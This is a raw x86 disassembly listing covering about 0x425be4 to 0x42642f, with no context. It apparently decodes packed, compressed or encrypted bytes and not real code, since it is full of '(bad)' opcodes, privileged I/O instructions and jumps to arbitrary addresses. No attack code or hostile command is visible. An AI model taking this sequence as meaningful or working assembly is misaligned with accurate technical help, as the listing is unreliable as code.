  425be4:	shufps xmm1,XMMWORD PTR [ecx-0x31],0x0
  425be9:	ins    DWORD PTR es:[edi],dx
  425bea:	(bad)  
  425beb:	or     DWORD PTR [esi],esp
  425bed:	add    cl,0xa4
  425bf0:	pop    ss
  425bf1:	(bad)  
  425bf2:	cdq    
  425bf3:	call   0xbf94:0x55f1c1c6
  425bfa:	jmp    0x425c53
  425bfc:	cli    
  425bfd:	mov    esi,0x6c85ef62
  425c02:	push   ebx
  425c03:	sub    al,0xc
  425c05:	inc    esi
  425c06:	jecxz  0x425b9d
  425c08:	test   DWORD PTR [ecx+0x30],ebx
  425c0b:	test   BYTE PTR [esi+edx*4+0x6708cb0d],al
  425c12:	lea    esi,[edx+0x1a]
  425c15:	mov    BYTE PTR [ebx-0x58c059a1],cl
  425c1b:	or     DWORD PTR [edx+ebp*4+0x2201bafb],ebx
  425c22:	jnp    0x425bd7
  425c24:	sub    edx,DWORD PTR [ebx-0x714e7556]
  425c2a:	mov    esp,0x5e3170c2
  425c2f:	mov    al,ds:0xc3c5572d
  425c34:	mov    bh,0xc
  425c36:	jne    0x425c8c
  425c38:	mov    esi,0x9a52af63
  425c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c3e:	and    al,0x2c
  425c40:	and    eax,0xdde9fcca
  425c45:	mov    ah,0x4d
  425c47:	fwait
  425c48:	data16 in al,0x59
  425c4b:	xor    al,0x83
  425c4d:	dec    edi
  425c4e:	and    al,0xf4
  425c50:	shl    BYTE PTR [edx-0x7bdecb4c],1
  425c56:	fwait
  425c57:	push   esp
  425c58:	int3   
  425c59:	dec    ecx
  425c5a:	xchg   esp,eax
  425c5b:	mov    ch,0x2
  425c5d:	loop   0x425cb2
  425c5f:	sbb    BYTE PTR [ebx-0x21],0x82
  425c63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c64:	adc    DWORD PTR [eax],ebx
  425c66:	mov    ds:0x7c862c50,al
  425c6b:	push   ebx
  425c6c:	aad    0xcc
  425c6e:	call   0x81eb34a4
  425c73:	dec    ebx
  425c74:	pop    ss
  425c75:	fisubr DWORD PTR [esi-0x5d20d6d]
  425c7b:	add    ecx,edi
  425c7d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  425c7f:	cdq    
  425c80:	mov    ds:0xf54f1684,al
  425c85:	cmp    al,0x1
  425c87:	scas   eax,DWORD PTR es:[edi]
  425c88:	loop   0x425cd1
  425c8a:	test   DWORD PTR [ebp-0x41],ebx
  425c8d:	retf   0xed0a
  425c90:	xchg   esp,eax
  425c91:	in     eax,0x3f
  425c93:	xchg   esi,eax
  425c94:	cmp    esp,esi
  425c96:	js     0x425c98
	...
  425d14:	out    0xd2,al
  425d16:	xchg   esp,eax
  425d17:	icebp  
  425d18:	mov    ah,0xf7
  425d1a:	out    0xd7,eax
  425d1c:	aad    0x75
  425d1e:	(bad)  
  425d1f:	adc    edx,eax
  425d21:	(bad)  
  425d23:	test   BYTE PTR [eax-0x11],dl
  425d26:	add    DWORD PTR [eax],eax
  425d28:	imul   eax,DWORD PTR [edi],0x0
  425d2b:	add    BYTE PTR ds:0xdd4dfd3c,ch
  425d31:	nop
  425d32:	cdq    
  425d33:	and    DWORD PTR [edi],0xbd77d765
  425d39:	bound  ebx,QWORD PTR [ecx+0x64]
  425d3c:	mov    ebx,DWORD PTR [edi]
  425d3e:	inc    esp
  425d3f:	inc    ecx
  425d40:	out    dx,al
  425d41:	cld    
  425d42:	and    eax,0x88738260
  425d47:	xchg   edx,eax
  425d48:	adc    DWORD PTR [esi+ecx*4],edi
  425d4b:	ret    
  425d4c:	out    dx,al
  425d4d:	sbb    eax,0x162b082e
  425d52:	icebp  
  425d53:	out    dx,eax
  425d54:	mov    ?,WORD PTR [eax]
  425d56:	mov    ah,BYTE PTR [esi+0x21c42989]
  425d5c:	mov    edx,0xf4722adc
  425d61:	out    dx,eax
  425d62:	sub    edx,ebx
  425d64:	jo     0x425d3f
  425d66:	test   eax,0xdacb32b8
  425d6b:	out    dx,al
  425d6c:	xchg   edx,eax
  425d6d:	loope  0x425d51
  425d6f:	je     0x425d96
  425d71:	sbb    eax,0x39d9f2ee
  425d76:	sub    al,BYTE PTR [ebx]
  425d78:	icebp  
  425d79:	cwde   
  425d7a:	mov    esi,DWORD PTR [edx+0xcf877df]
  425d80:	add    ebx,ebp
  425d82:	loop   0x425d5c
  425d84:	sbb    al,0x84
  425d86:	imul   ecx,DWORD PTR [edx-0x4195e02d],0xfffffff1
  425d8d:	push   edx
  425d8e:	mov    al,ds:0xcde75ca3
  425d93:	call   0x9e89a56
  425d98:	push   0xf0635be6
  425d9d:	push   ebp
  425d9e:	mov    bh,0x5b
  425da0:	in     eax,dx
  425da1:	in     eax,dx
  425da2:	cmp    eax,0xf9a2e91
  425da7:	test   BYTE PTR [edi+0x26],0xf1
  425dab:	sub    cl,ch
  425dad:	mov    ebx,0x3891ab6b
  425db2:	mov    bl,0x53
  425db4:	pop    esi
  425db5:	pop    eax
  425db6:	dec    esp
  425db7:	dec    ebp
  425db8:	imul   esp,ecx,0x4bf136fe
  425dbe:	dec    edx
  425dbf:	sub    DWORD PTR [edi],0x45ab38ff
  425dc5:	sbb    DWORD PTR [ebx+ebp*2+0x28433e65],edi
  425dcc:	or     al,0x79
  425dce:	stc    
  425dcf:	pop    edi
  425dd0:	sub    ch,BYTE PTR [esi-0x1bd2487]
  425dd6:	add    BYTE PTR [eax],al
  425dd8:	push   es
  425dd9:	push   esi
  425dda:	mov    ebp,0x779d22b7
  425ddf:	sub    ah,BYTE PTR [esi-0x45]
  425de2:	and    DWORD PTR [edi-0x7354bf4e],0x55
  425de9:	lahf   
  425dea:	and    al,0x6d
  425dec:	xor    al,0x1b
  425dee:	mov    cl,0x1e
  425df0:	data16 xor BYTE PTR [edi+0x1c676eb2],al
  425df7:	dec    ebx
  425df8:	test   eax,0xf7dabe93
  425dfd:	pop    eax
  425dfe:	imul   ebx,eax,0x50
  425e01:	pop    ebp
  425e02:	fild   WORD PTR [ebp+0x2ddb607d]
  425e08:	test   DWORD PTR [ebp+0x63],esp
  425e0b:	int3   
  425e0c:	aaa    
  425e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e0e:	lods   al,BYTE PTR ds:[esi]
  425e0f:	mov    edx,0x5363d17
  425e14:	mov    ch,0x2f
  425e16:	jnp    0x425e96
  425e18:	mov    DWORD PTR [ebx],ebp
  425e1a:	mov    cl,0x3e
  425e1c:	loopne 0x425d9f
  425e1e:	pop    edx
  425e1f:	inc    edi
  425e20:	pop    esp
  425e21:	push   eax
  425e22:	adc    ch,BYTE PTR [esi+0x2]
  425e25:	shl    BYTE PTR [ecx+0x5ffcdc10],1
  425e2b:	add    esp,DWORD PTR [eax-0x7ca4274d]
  425e31:	ret    0xde3e
  425e34:	jno    0x425e14
  425e36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e37:	out    dx,eax
  425e38:	mov    ebx,0xa0a62c57
  425e3d:	push   ss
  425e3e:	aad    0xf6
  425e40:	dec    eax
  425e41:	icebp  
  425e42:	inc    ecx
  425e43:	mov    ah,0x49
  425e45:	ins    DWORD PTR es:[edi],dx
  425e46:	pop    eax
  425e47:	cli    
  425e48:	out    0x58,al
  425e4a:	inc    edx
  425e4b:	add    BYTE PTR [ecx],al
  425e4d:	xchg   esi,eax
  425e4e:	icebp  
  425e4f:	xchg   BYTE PTR [ecx-0x4d55d914],al
  425e55:	mov    ebx,0x671c079f
  425e5a:	mov    WORD PTR [esi+0x62ef506f],es
  425e60:	aas    
  425e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e62:	sub    DWORD PTR [ecx],esi
  425e64:	pop    eax
  425e65:	mov    ch,0x91
  425e67:	lds    ebx,FWORD PTR [eax+0x471b694a]
  425e6d:	and    ch,BYTE PTR [ebx+0x6c876e3a]
  425e73:	mov    ds:0xce9b3d94,al
  425e78:	popf   
  425e79:	data16 mov dh,0x51
  425e7c:	repz push esi
  425e7e:	data16 adc BYTE PTR [edx+ebp*2-0x3a9995f3],0xf8
  425e87:	push   eax
  425e88:	fst    st(5)
  425e8a:	inc    ebp
  425e8b:	xor    eax,0xee8beb3e
  425e90:	(bad)  
  425e91:	stos   DWORD PTR es:[edi],eax
  425e92:	and    DWORD PTR [edx-0xde0538f],0xffffffae
  425e99:	into   
  425e9a:	aas    
  425e9b:	leave  
  425e9c:	ficomp DWORD PTR [edx-0x2e5122ff]
  425ea2:	mov    DWORD PTR [ebx],esp
  425ea4:	test   BYTE PTR [edx+ebx*1-0x2ff07e91],ch
  425eab:	cdq    
  425eac:	sti    
  425ead:	dec    esi
  425eae:	inc    eax
  425eaf:	pop    esi
  425eb0:	mov    ds:0xc2e840cc,eax
  425eb5:	fs gs push edx
  425eb8:	in     eax,dx
  425eb9:	pushf  
  425eba:	push   ds
  425ebb:	mov    ch,0x1a
  425ebd:	icebp  
  425ebe:	adc    BYTE PTR [ebx-0x64ad3952],0xd2
  425ec5:	cmp    DWORD PTR [ebp-0x1e],eax
  425ec8:	fwait
  425ec9:	mov    dl,0xc
  425ecb:	test   BYTE PTR [eax+0x3ec02ad2],cl
  425ed1:	push   esi
  425ed2:	mov    ecx,0xa807cf68
  425ed7:	and    edx,DWORD PTR [edx]
  425ed9:	call   0xd69486f2
  425ede:	xor    DWORD PTR [ecx-0xf664220],eax
  425ee4:	pop    ebx
  425ee5:	mov    al,0xb1
  425ee7:	sub    dl,BYTE PTR [esp+eax*1]
  425eea:	and    al,0x8e
  425eec:	inc    eax
  425eed:	cwde   
  425eee:	mov    al,ds:0x1b1fe9dc
  425ef3:	fldenv [ecx-0x70104531]
  425ef9:	xor    al,0xa8
  425efb:	mov    dh,0x77
  425efd:	in     al,dx
  425efe:	es xor al,0x59
  425f01:	adc    eax,0xef03e77a
  425f06:	iret   
  425f07:	mov    ebx,0xec5c49e7
  425f0c:	adc    al,0xeb
  425f0e:	test   eax,0x1e1e7da7
  425f13:	sub    eax,0xae97a88b
  425f18:	int3   
  425f19:	ins    DWORD PTR es:[edi],dx
  425f1a:	fwait
  425f1b:	aas    
  425f1c:	xchg   esp,ebp
  425f1e:	xchg   edx,eax
  425f1f:	add    ecx,ebx
  425f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f22:	push   cs
  425f23:	jmp    0x425ed5
  425f25:	sub    ch,BYTE PTR [edi+0x61]
  425f28:	pop    ecx
  425f29:	(bad)  [ebp+0x6e]
  425f2c:	inc    esi
  425f2d:	test   eax,0x95a6368b
  425f32:	mov    ecx,0x18d0fdf9
  425f37:	pop    edi
  425f38:	mov    al,0xbe
  425f3a:	push   ss
  425f3b:	mov    ah,0x7e
  425f3d:	xchg   edx,eax
  425f3e:	ins    BYTE PTR es:[edi],dx
  425f3f:	rol    DWORD PTR [edx+0x65],1
  425f42:	sub    esi,edx
  425f44:	adc    al,0x8f
  425f46:	in     al,0xf8
  425f48:	xchg   edx,eax
  425f49:	aam    0x7b
  425f4b:	stc    
  425f4c:	(bad)  [eax-0x5465f349]
  425f52:	shl    dl,1
  425f54:	mov    ah,0x59
  425f56:	mov    ds:0xac8701ba,eax
  425f5b:	out    0x73,al
  425f5d:	jmp    0xd1cec45c
  425f62:	icebp  
  425f63:	pop    edx
  425f64:	call   0xc8f0:0xc41cd831
  425f6b:	ret    0x5310
  425f6e:	fcomp  QWORD PTR [eax-0x76d10da8]
  425f74:	(bad)  
  425f76:	cld    
  425f77:	je     0x425f54
  425f79:	jp     0x425f2c
  425f7b:	xchg   edi,eax
  425f7c:	mov    eax,edx
  425f7e:	(bad)  
  425f7f:	ja     0x425f17
  425f81:	xchg   ebp,eax
  425f82:	retf   0x9e40
  425f85:	popa   
  425f86:	in     eax,dx
  425f87:	sbb    DWORD PTR [edi+0x58],esi
  425f8a:	out    0x4,al
  425f8c:	imul   DWORD PTR [esi+0x8]
  425f8f:	inc    esi
  425f90:	or     DWORD PTR [eax-0x5553cadd],0xffffffa9
  425f97:	or     ch,BYTE PTR [ebx]
  425f99:	mov    dh,0xbd
  425f9b:	sub    ecx,DWORD PTR [eax+0x1a]
  425f9e:	sub    DWORD PTR [esi+edx*8],esp
  425fa1:	int3   
  425fa2:	mov    ah,0xc6
  425fa4:	jno    0x425fac
  425fa6:	(bad)  
  425fa8:	aaa    
  425fa9:	mov    eax,ds:0x4a636ba7
  425fae:	addr16 inc ebx
  425fb0:	aaa    
  425fb1:	adc    BYTE PTR [edi],bl
  425fb3:	loopne 0x425fb5
  425fb5:	out    0xa4,eax
  425fb7:	nop
  425fb8:	xchg   esi,eax
  425fb9:	add    DWORD PTR [ebx-0x121a8d28],ebx
  425fbf:	inc    esi
  425fc1:	dec    edi
  425fc2:	mov    eax,ds:0x81034acf
  425fc7:	push   ebx
  425fc8:	sbb    DWORD PTR [ebx-0x68],0x2bc6bf8a
  425fcf:	xlat   BYTE PTR ds:[ebx]
  425fd0:	mov    ah,0xc3
  425fd2:	ja     0x42602c
  425fd4:	mov    BYTE PTR [ebx-0x7938565],al
  425fda:	retf   0x9a4d
  425fdd:	sub    edx,DWORD PTR [eax+0x77]
  425fe0:	inc    edx
  425fe1:	aas    
  425fe2:	add    edi,DWORD PTR [esp+edx*2-0x27]
  425fe6:	loopne 0x425f95
  425fe8:	int3   
  425fe9:	xchg   ebx,eax
  425fea:	xor    DWORD PTR [esi+0x1d],ebp
  425fed:	loop   0x425fce
  425fef:	std    
  425ff0:	retf   0x7859
  425ff3:	js     0x42606a
  425ff5:	and    bh,BYTE PTR ds:0x5bcada7c
  425ffb:	adc    al,0xa5
  425ffd:	add    dl,dl
  425fff:	inc    ebp
  426000:	pop    esp
  426001:	inc    esi
  426002:	jg     0x425f98
  426004:	xchg   edx,eax
  426005:	ret    0xdca1
  426008:	mov    al,0x21
  42600a:	and    eax,0x1bbd17df
  42600f:	test   DWORD PTR [eax+0x7f],esp
  426012:	stc    
  426013:	es das 
  426015:	mov    ebx,0x4974e439
  42601a:	int3   
  42601b:	sbb    DWORD PTR [ebp+0x61],esp
  42601e:	fs pop ebp
  426020:	and    al,0x6c
  426022:	and    dh,BYTE PTR es:[edi-0x1f46a97a]
  426029:	and    DWORD PTR ds:0xae275081,ecx
  42602f:	into   
  426030:	xchg   esp,eax
  426031:	dec    edx
  426032:	sbb    ebx,ebx
  426034:	sub    BYTE PTR ds:0x3bac2c6b,dl
  42603a:	addr16 out dx,ax
  42603d:	push   edi
  42603e:	retf   
  42603f:	div    DWORD PTR [edi+0x7b5c423d]
  426045:	pop    edi
  426046:	jae    0x426095
  426048:	jmp    0x113071c
  42604d:	add    bl,ch
  42604f:	out    0x66,eax
  426051:	add    al,0x77
  426053:	xchg   ebx,eax
  426054:	pusha  
  426055:	mov    ebx,0x3a9351a5
  42605a:	shl    DWORD PTR [eax+eax*8-0x51670bd5],0xee
  426062:	rcl    DWORD PTR [edi-0x6b],1
  426065:	pop    ebp
  426066:	mov    ah,0x4c
  426068:	daa    
  426069:	or     esi,DWORD PTR [esi-0x1fe61e15]
  42606f:	shrd   ecx,esi,cl
  426072:	test   al,0xe
  426074:	push   ss
  426075:	int3   
  426076:	es jg  0x4260be
  426079:	pop    ebp
  42607a:	dec    edx
  42607b:	dec    ebx
  42607c:	adc    eax,0x3b5d7444
  426081:	xchg   ecx,eax
  426082:	frstpm(287 only) 
  426084:	lahf   
  426085:	sti    
  426086:	and    al,0xa1
  426088:	xor    BYTE PTR [ebp+0x47],0xda
  42608c:	frstor [eax+0x4b]
  42608f:	sub    ecx,DWORD PTR [ebx-0x4]
  426092:	cmp    esp,DWORD PTR [edx+0x52]
  426095:	jne    0x426038
  426097:	jae    0x42609c
  426099:	scas   eax,DWORD PTR es:[edi]
  42609a:	(bad)  
  42609b:	jb     0x426117
  42609d:	xor    al,0xd1
  42609f:	ret    
  4260a0:	sbb    edx,esp
  4260a2:	inc    ebp
  4260a3:	mov    al,ds:0xaa068e03
  4260a8:	in     al,0xb7
  4260aa:	mov    ds:0xd72299db,eax
  4260af:	fisubr WORD PTR [ecx+0xd68042f]
  4260b5:	pop    edi
  4260b6:	std    
  4260b7:	clc    
  4260b8:	cmp    al,al
  4260ba:	mov    cl,0x61
  4260bc:	shr    DWORD PTR [esi-0x3c],1
  4260bf:	enter  0x356b,0xd5
  4260c3:	and    eax,0x94108c81
  4260c8:	outs   dx,BYTE PTR ds:[esi]
  4260c9:	imul   dh
  4260cb:	mov    edx,0x72cbfd78
  4260d0:	fdivrp st(5),st
  4260d2:	xchg   ecx,eax
  4260d3:	(bad)  
  4260d4:	push   esp
  4260d5:	sbb    ebx,ecx
  4260d7:	xchg   ebp,eax
  4260d8:	jno    0x4260e2
  4260da:	mov    eax,0x31852493
  4260df:	cmp    DWORD PTR [ebp+0xe6b2346],ecx
  4260e5:	jbe    0x4260f4
  4260e7:	aas    
  4260e8:	mov    dh,0xba
  4260ea:	xchg   edx,eax
  4260eb:	xor    ecx,DWORD PTR [ebx+0x8ede5e8]
  4260f1:	inc    edi
  4260f2:	adc    ebx,eax
  4260f4:	sbb    BYTE PTR [eax],al
  4260f6:	test   cl,ch
  4260f8:	ret    
  4260f9:	dec    ebx
  4260fa:	mov    ch,BYTE PTR [esi]
  4260fc:	popf   
  4260fd:	retf   
  4260fe:	dec    esp
  4260ff:	xor    al,0xfe
  426101:	push   esp
  426102:	lea    ebp,[eax]
  426104:	int    0x69
  426106:	adc    DWORD PTR [edi+esi*1-0x51bd8102],eax
  42610d:	repz in al,0xee
  426110:	pop    eax
  426111:	in     al,dx
  426112:	aam    0xbf
  426114:	push   esi
  426115:	inc    esi
  426116:	and    BYTE PTR [esi],bh
  426118:	jg     0x42614b
  42611a:	lea    esp,[ebx+0x5a]
  42611d:	dec    esp
  42611e:	and    DWORD PTR [esi+0x552603f4],0x2a
  426125:	cs int 0x14
  426128:	std    
  426129:	and    DWORD PTR [eax-0x71],esp
  42612c:	fwait
  42612d:	leave  
  42612e:	inc    ecx
  42612f:	xlat   BYTE PTR ds:[ebx]
  426130:	mov    ds:0x8aa2d705,eax
  426135:	mov    al,ds:0xbf0d31b9
  42613a:	adc    ebp,DWORD PTR [ebp-0x2d]
  42613d:	xchg   BYTE PTR [ebp+0x1d],bl
  426140:	and    dl,BYTE PTR [ebx]
  426142:	shr    BYTE PTR [esi+0x3b56076f],0x3d
  426149:	and    dl,BYTE PTR [ebx]
  42614b:	sub    al,0x91
  42614d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42614e:	mov    eax,0xa8725825
  426153:	xor    eax,0xa068b900
  426158:	fmul   DWORD PTR [esi+0x49]
  42615b:	push   ecx
  42615c:	add    edi,DWORD PTR [edi-0x2e]
  42615f:	inc    esp
  426160:	inc    si
  426162:	clc    
  426163:	in     eax,dx
  426164:	jne    0x4260fe
  426166:	or     BYTE PTR [eax-0x4e],dl
  426169:	jmp    0x4ff0:0x7ed094d4
  426170:	mov    ah,0x29
  426172:	lds    esp,FWORD PTR [edi+0x38]
  426175:	pop    es
  426176:	fst    st(4)
  426178:	rol    ebp,0x1c
  42617b:	mov    dl,0xf
  42617d:	xchg   BYTE PTR [ebx+0x78],bl
  426180:	or     eax,0x40bafa8a
  426185:	cmp    bl,bl
  426187:	cmp    cl,dl
  426189:	push   0xffffff93
  42618b:	enter  0x5952,0x81
  42618f:	les    edx,FWORD PTR [edi-0x68]
  426192:	push   ds
  426193:	add    eax,0xbe80ec98
  426198:	retf   0x53bc
  42619b:	hlt    
  42619c:	pop    esi
  42619d:	mov    edi,0x7459a326
  4261a2:	outs   dx,DWORD PTR ds:[esi]
  4261a3:	and    al,0x91
  4261a5:	pop    ds
  4261a6:	loope  0x42619e
  4261a8:	add    ebx,DWORD PTR [edi+0x7b09f815]
  4261ae:	mov    ebx,0x13295a04
  4261b3:	pop    ebx
  4261b4:	enter  0x4dde,0x52
  4261b8:	neg    BYTE PTR [eax+0x14]
  4261bb:	mov    BYTE PTR [edi+0x497ac4ce],bl
  4261c1:	xchg   edx,eax
  4261c2:	adc    eax,0x5a5236f7
  4261c7:	xchg   edx,eax
  4261c8:	cmp    al,BYTE PTR [esi+0x7b]
  4261cb:	xchg   ebp,eax
  4261cc:	popf   
  4261cd:	pop    edx
  4261ce:	cmp    esi,edi
  4261d0:	sbb    eax,DWORD PTR [edi+0x5b]
  4261d3:	adc    cl,dl
  4261d5:	push   esp
  4261d6:	mov    ah,0xf3
  4261d8:	ffree  st(3)
  4261da:	sti    
  4261db:	retf   0xf3a5
  4261de:	xchg   esp,eax
  4261df:	dec    edx
  4261e0:	xor    esi,DWORD PTR [edx+0x56f7ed2]
  4261e6:	jbe    0x426187
  4261e8:	adc    eax,0x2af01d8f
  4261ed:	push   ds
  4261ee:	add    ch,cl
  4261f0:	cmp    al,0x95
  4261f2:	push   eax
  4261f3:	jle    0x42621a
  4261f5:	xor    cx,WORD PTR ds:0x9bab72c7
  4261fc:	pop    edx
  4261fd:	pop    es
  4261fe:	test   edx,edx
  426200:	imul   bp,WORD PTR [bx-0x63],0xffe2
  426206:	fs call 0x1b5ef35d
  42620c:	call   0xff10f222
  426211:	pop    edi
  426212:	xchg   ecx,eax
  426213:	xchg   DWORD PTR ds:0x6704bbbb,esi
  426219:	xchg   esi,eax
  42621a:	mov    cl,0x3f
  42621c:	add    al,ah
  42621e:	xor    al,0x9a
  426220:	jo     0x4261bf
  426222:	inc    edi
  426223:	arpl   WORD PTR [ecx+0x5a],bp
  426226:	hlt    
  426227:	and    eax,0xcc788aa7
  42622c:	hlt    
  42622d:	sub    al,0x6c
  42622f:	pop    ss
  426230:	cmp    ebp,DWORD PTR [ebp-0x7a1ef2da]
  426236:	cmp    bl,BYTE PTR [ecx+0x1a]
  426239:	xchg   BYTE PTR [ebx-0x45],al
  42623c:	aad    0x84
  42623e:	retf   
  42623f:	cmc    
  426240:	and    DWORD PTR [ebp-0x5a],0x48
  426244:	imul   esp,DWORD PTR [ecx+eiz*1],0xf
  426248:	jecxz  0x4262a0
  42624a:	jne    0x426279
  42624c:	fist   WORD PTR [esi+0x63c15f54]
  426252:	xor    bl,BYTE PTR [eax+0x79debd21]
  426258:	push   ecx
  426259:	icebp  
  42625a:	lods   eax,DWORD PTR ds:[esi]
  42625b:	sub    al,0xb6
  42625d:	enter  0xeec7,0x4b
  426261:	sub    BYTE PTR [esi+0x66],al
  426264:	addr16 push ecx
  426266:	pop    ebx
  426267:	into   
  426268:	jmp    0x42628a
  42626a:	shr    ch,cl
  42626c:	cwde   
  42626d:	popa   
  42626e:	push   ebp
  42626f:	loop   0x4261f5
  426271:	or     eax,0xd2ba18db
  426276:	pop    ss
  426277:	iret   
  426278:	fs inc ecx
  42627a:	xchg   esp,eax
  42627b:	mov    ah,0x96
  42627d:	adc    DWORD PTR [ebx+0x7c],ecx
  426280:	repnz adc bl,BYTE PTR [ebx-0x7e0ff5d0]
  426287:	and    eax,0x359a73eb
  42628c:	and    edi,DWORD PTR [esi-0x4d]
  42628f:	retf   0xd8d4
  426292:	cmp    ebx,DWORD PTR [edi]
  426294:	test   BYTE PTR [ecx-0x69],0x78
  426298:	and    al,0x5b
  42629a:	jne    0x426288
  42629c:	inc    BYTE PTR [eax-0x307d25c]
  4262a2:	adc    BYTE PTR [ecx+0x1cab19c6],cl
  4262a8:	pop    ebx
  4262a9:	popa   
  4262aa:	loope  0x426321
  4262ac:	push   ds
  4262ad:	cmp    al,0x8f
  4262af:	jne    0x426303
  4262b1:	jb     0x426240
  4262b3:	mov    dh,0x27
  4262b5:	mov    dh,0x1e
  4262b7:	or     eax,0x6eedbbd
  4262bc:	xchg   ebp,eax
  4262bd:	push   0xe5dcea16
  4262c2:	ror    BYTE PTR [esi+ecx*4],cl
  4262c5:	mov    eax,ds:0x937aa678
  4262ca:	inc    esi
  4262cb:	mov    bh,0x96
  4262cd:	out    dx,al
  4262ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262cf:	push   esp
  4262d0:	xlat   BYTE PTR ds:[ebx]
  4262d1:	pop    ebp
  4262d2:	mov    bl,0x6e
  4262d4:	xchg   ebx,eax
  4262d5:	(bad)  
  4262d6:	shl    edi,cl
  4262d8:	add    BYTE PTR [ebx-0x547bbbc1],dh
  4262de:	std    
  4262df:	popa   
  4262e0:	clc    
  4262e1:	mov    edi,0xd440f334
  4262e6:	das    
  4262e7:	pop    ecx
  4262e8:	out    0x83,al
  4262ea:	inc    ecx
  4262eb:	pop    edi
  4262ec:	js     0x4262ff
  4262ee:	mov    al,0x73
  4262f0:	cld    
  4262f1:	cmp    bh,0xd7
  4262f4:	sbb    esp,DWORD PTR [edx+ecx*4+0x60]
  4262f8:	pop    edi
  4262f9:	aad    0x9f
  4262fb:	inc    edx
  4262fc:	mov    esi,0xb2376003
  426301:	std    
  426302:	add    ch,dl
  426304:	mov    edi,0x1a138d58
  426309:	mov    dl,0xd0
  42630b:	ror    WORD PTR [edx+eax*1],cl
  42630f:	mov    ebx,ecx
  426311:	xchg   ecx,eax
  426312:	push   eax
  426313:	jne    0x426361
  426315:	repnz sub DWORD PTR [ecx],esp
  426318:	xchg   edi,eax
  426319:	pushf  
  42631a:	scas   eax,DWORD PTR es:[edi]
  42631b:	jmp    0x4262b9
  42631d:	ja     0x4262c5
  42631f:	xchg   esi,eax
  426320:	dec    edi
  426321:	mul    BYTE PTR [ebx+0x44]
  426324:	cmp    al,0xd3
  426326:	cwde   
  426327:	clc    
  426328:	xchg   esi,eax
  426329:	rcl    DWORD PTR fs:[edx+edx*2],1
  42632d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42632e:	and    al,0xa3
  426330:	popa   
  426331:	adc    ch,dh
  426333:	sub    eax,0x20791fba
  426338:	push   0xffffffbf
  42633a:	ret    
  42633b:	test   ebx,edi
  42633d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42633e:	or     bh,BYTE PTR [edi+0x54]
  426341:	out    dx,eax
  426342:	push   esi
  426343:	shl    DWORD PTR [esi],1
  426345:	ins    DWORD PTR es:[edi],dx
  426346:	retf   0xe418
  426349:	dec    esp
  42634a:	aad    0xc1
  42634c:	add    al,0xa5
  42634e:	arpl   WORD PTR [esi],sp
  426350:	hlt    
  426351:	inc    edi
  426352:	test   DWORD PTR [ebx],edi
  426354:	div    BYTE PTR ds:0xf8edec96
  42635a:	push   ebp
  42635b:	xchg   edx,eax
  42635c:	fisub  WORD PTR [esi+0x3b]
  42635f:	inc    ebp
  426360:	push   ecx
  426361:	sti    
  426362:	call   0xac5f58da
  426367:	addr16 dec esi
  426369:	out    0x9,al
  42636b:	fcom   QWORD PTR [edi+0x5d202a93]
  426371:	icebp  
  426372:	nop
  426373:	pop    ebp
  426374:	adc    ecx,DWORD PTR [edx-0x6d]
  426377:	out    dx,al
  426378:	js     0x42632a
  42637a:	or     BYTE PTR [esi],0xf7
  42637d:	xor    esp,DWORD PTR [edi+edi*1-0xb]
  426381:	cwde   
  426382:	cdq    
  426383:	jl     0x426338
  426385:	mov    bh,0x67
  426387:	add    eax,0x2718babd
  42638c:	das    
  42638d:	test   eax,0x993113bf
  426392:	xor    BYTE PTR [ebp+0x43],0x8a
  426396:	retf   0xb3c1
  426399:	aaa    
  42639a:	pop    eax
  42639b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42639c:	inc    edx
  42639d:	push   edi
  42639e:	fst    DWORD PTR [esi-0x6977ba23]
  4263a4:	std    
  4263a5:	daa    
  4263a6:	mov    ds:0x9276c066,al
  4263ab:	pop    esp
  4263ac:	cmp    al,0xf0
  4263ae:	lock aas 
  4263b0:	jmp    0x7566:0x4b8cc108
  4263b7:	aad    0x7f
  4263b9:	into   
  4263ba:	(bad)  
  4263bb:	and    DWORD PTR [ebp+0x19],esp
  4263be:	pop    ss
  4263bf:	data16 shr BYTE PTR [edi-0x58],0x1c
  4263c4:	push   0x227ade89
  4263c9:	pop    ss
  4263ca:	lahf   
  4263cb:	jno    0x426448
  4263cd:	adc    DWORD PTR [edx+0x23],0x1fc4971c
  4263d4:	scas   eax,DWORD PTR es:[edi]
  4263d5:	jbe    0x426404
  4263d7:	or     dh,dl
  4263d9:	push   ebp
  4263da:	jno    0x4263fb
  4263dc:	ins    DWORD PTR es:[edi],dx
  4263dd:	mov    dh,0xc7
  4263df:	test   DWORD PTR [edx+0x23],ebp
  4263e2:	outs   dx,DWORD PTR ds:[esi]
  4263e3:	or     al,0x29
  4263e5:	pop    esp
  4263e6:	inc    edx
  4263e7:	jns    0x4263ae
  4263e9:	push   ds
  4263ea:	xchg   ebx,eax
  4263eb:	dec    esi
  4263ec:	fcomip st,st(4)
  4263ee:	inc    ebx
  4263ef:	jecxz  0x426417
  4263f1:	fcmove st,st(2)
  4263f3:	xor    ecx,DWORD PTR [eax]
  4263f5:	mov    dl,0x8
  4263f7:	jbe    0x4263be
  4263f9:	idiv   BYTE PTR [ebx]
  4263fb:	mov    edi,0x8ed96f72
  426400:	mov    DWORD PTR [edi-0x2086e020],ebp
  426406:	cmp    ebx,DWORD PTR [esi]
  426408:	sti    
  426409:	fidiv  WORD PTR [ecx+ecx*2]
  42640c:	ret    
  42640d:	jno    0x4263bb
  42640f:	popa   
  426410:	sbb    esp,ecx
  426412:	cld    
  426413:	or     DWORD PTR [ebp-0x3391870f],esp
  426419:	jnp    0x4263b2
  42641b:	and    DWORD PTR [edx+edx*1+0x2dcca1a0],edi
  426422:	dec    ebx
  426423:	shl    BYTE PTR [ecx+0x50],cl
  426426:	imul   ebp,DWORD PTR [esi-0x2d],0x48d48659
  42642d:	loopne 0x4263d3
  42642f:	xchg   BYTE PTR [eax+0x2ca1f77a],cl
